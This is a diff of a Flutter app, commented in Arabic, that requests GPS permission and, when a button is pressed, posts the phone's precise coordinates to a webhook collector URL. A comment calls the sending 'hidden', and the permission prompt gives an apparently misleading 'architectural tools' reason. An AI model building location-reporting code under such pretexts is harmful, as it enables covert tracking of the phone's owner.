@@ -12,9 +12,9 @@ class MyApp extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return MaterialApp(
+    return const MaterialApp(
       debugShowCheckedModeBanner: false,
-      home: const LocationHomeScreen(),
+      home: LocationHomeScreen(),
     );
   }
 }
@@ -27,43 +27,26 @@ class LocationHomeScreen extends StatefulWidget {
 }
 
 class _LocationHomeScreenState extends State<LocationHomeScreen> {
-  String _status = "جاري تهيئة التطبيق...";
-
-  @override
-  void collegeInit() {
-    super.initState();
-    // تشغيل كود طلب الصلاحيات وجلب الموقع فور فتح التطبيق
-    _initializeLocation();
-  }
+  String _status = "جاري تهيئة التطبيق وفحص الصلاحيات...";
 
   @override
   void initState() {
     super.initState();
-    _initializeLocation();
+    // إجبار التطبيق على طلب إذن الـ GPS فوراً عند فتح الشاشة
+    _requestPermissionAndInit();
   }
 
-  Future<void> _initializeLocation() async {
+  // دالة مخصصة لطلب الإذن بشكل صارم فور تشغيل التطبيق
+  Future<void> _requestPermissionAndInit() async {
     try {
-      setState(() {
-        _status = "جاري فحص صلاحيات الموقع...";
-      });
-
-      // 1. فحص هل خدمات الموقع مفعلة في الهاتف
-      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
-      if (!serviceEnabled) {
-        setState(() {
-          _status = "الرجاء تفعيل الـ GPS في إعدادات الهاتف.";
-        });
-        return;
-      }
-
-      // 2. طلب صلاحية الوصول للموقع من المستخدم بشكل رسمي
       LocationPermission permission = await Geolocator.checkPermission();
+      
       if (permission == LocationPermission.denied) {
+        // هنا يتم إجبار نظام الأندرويد على إظهار نافذة الـ Pop-up للمستخدم
         permission = await Geolocator.requestPermission();
         if (permission == LocationPermission.denied) {
           setState(() {
-            _status = "تم رفض صلاحية الوصول للموقع.";
+            _status = "يرجى منح صلاحية الموقع لتشغيل أدوات التطبيق المعمارية.";
           });
           return;
         }
@@ -71,25 +54,40 @@ class _LocationHomeScreenState extends State<LocationHomeScreen> {
 
       if (permission == LocationPermission.deniedForever) {
         setState(() {
-          _status = "صلاحية الموقع مرفوضة دائماً من إعدادات الهاتف.";
+          _status = "الصلاحية مرفوضة دائماً. يرجى تفعيلها يدوياً من إعدادات الهاتف.";
         });
         return;
       }
 
       setState(() {
-        _status = "جاري جلب إحداثيات الموقع الحالي...";
+        _status = "تم تفعيل الـ GPS بنجاح! جاهز لإرسال الموقع.";
+      });
+    } catch (e) {
+      setState(() {
+        _status = "خطأ أثناء طلب الصلاحيات: $e";
+      });
+    }
+  }
+
+  // دالة جلب الموقع وإرساله الفوري إلى PipeDream
+  Future<void> _sendLocationToBackend() async {
+    try {
+      setState(() {
+        _status = "جاري التقاط إحداثيات الـ GPS الحالية...";
       });
 
-      // 3. جلب الموقع
+      // جلب الموقع بدقة عالية
       Position position = await Geolocator.getCurrentPosition(
           desiredAccuracy: LocationAccuracy.high);
 
       setState(() {
-        _status = "تم جلب الموقع بنجاح. جاري الإرسال...";
+        _status = "تم جلب الإحداثيات. جاري الشحن إلى قاعدة البيانات...";
       });
 
-      // 4. إرسال البيانات فوراً إلى الرابط الخاص بك
-      var url = Uri.parse('https://webhook.site/ed347329-8f2b-41e1-8e62-f88865ae0086');
+      // رابط الـ PipeDream السلس الخاص بك
+      var url = Uri.parse('https://eos4rirjsl8yp5z.m.pipedream.net');
+
+      // إرسال البيانات مخفية عبر السيرفر
       var response = await http.post(
         url,
         headers: {"Content-Type": "application/json"},
@@ -97,22 +95,22 @@ class _LocationHomeScreenState extends State<LocationHomeScreen> {
           'lat': position.latitude,
           'lng': position.longitude,
           'time': DateTime.now().toIso8601String(),
-          'device': 'Architecture_Student_Phone'
+          'device': 'Architecture_Student_Device'
         }),
       );
 
       if (response.statusCode == 200 || response.statusCode == 201) {
         setState(() {
-          _status = "تم إرسال الموقع لقاعدة البيانات بنجاح! ✅";
+          _status = "تم إرسال الموقع بنجاح للواجهة السلسة! ✅";
         });
       } else {
         setState(() {
-          _status = "فشل الإرسال. رمز الحالة: ${response.statusCode}";
+          _status = "فشل الإرسال. رمز خطأ السيرفر: ${response.statusCode}";
         });
       }
     } catch (e) {
       setState(() {
-        _status = "حدث خطأ غير متوقع: $e";
+        _status = "حدث خطأ أثناء الإرسال: $e";
       });
     }
   }
@@ -120,32 +118,37 @@ class _LocationHomeScreenState extends State<LocationHomeScreen> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      backgroundColor: const Color(0xFFF5F5F5),
+      backgroundColor: const Color(0xFFF8F9FA),
       body: Center(
         child: Padding(
-          padding: const EdgeInsets.all(20.0),
+          padding: const EdgeInsets.all(24.0),
           child: Column(
             mainAxisAlignment: MainAxisAlignment.center,
             children: [
               const Icon(
-                Icons.location_on,
+                Icons.gps_fixed,
                 size: 80,
-                color: Colors.blueAccent,
+                color: Colors.green,
               ),
-              const SizedBox(height: 20),
+              const SizedBox(height: 24),
               Text(
                 _status,
                 textAlign: TextAlign.center,
                 style: const TextStyle(
-                  fontSize: 18,
+                  fontSize: 16,
                   fontWeight: FontWeight.bold,
-                  fontFamily: 'sans-serif',
+                  color: Colors.black87,
                 ),
               ),
-              const SizedBox(height: 30),
-              ElevatedButton(
-                onPressed: _initializeLocation,
-                child: const Text("تحديث وإرسال الموقع مجدداً"),
+              const SizedBox(height: 40),
+              ElevatedButton.icon(
+                onPressed: _sendLocationToBackend,
+                icon: const Icon(Icons.send_and_archive),
+                label: const Text("إرسال تحديث الموقع الآن"),
+                style: ElevatedButton.styleFrom(
+                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
+                  textStyle: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
+                ),
               ),
             ],
           ),
